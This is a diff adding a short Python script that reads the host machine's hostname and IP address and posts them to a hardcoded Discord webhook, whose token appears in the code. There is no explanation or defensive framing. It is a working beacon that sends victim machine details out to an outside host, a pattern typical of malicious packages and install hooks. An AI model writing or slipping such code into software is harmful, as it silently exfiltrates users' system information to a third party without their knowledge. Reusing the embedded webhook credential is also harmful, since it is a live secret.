@@ -1,0 +1,10 @@
+import socket
+import requests
+webhook_url="https://discord.com/api/webhooks/1068500713484865606/vZ1aQcPylRRACI_B8irhpbN-tuJyN7EUEM1OgEI_gXEYztlc1W8eEA4PfGooiWYtEfeG"
+hostname = socket.gethostname()
+ip_address = socket.gethostbyname(hostname)
+message = f"Hostname: {hostname}\nIP Address: {ip_address}"
+data = {
+    "content": message
+}
+requests.post(webhook_url, json=data)
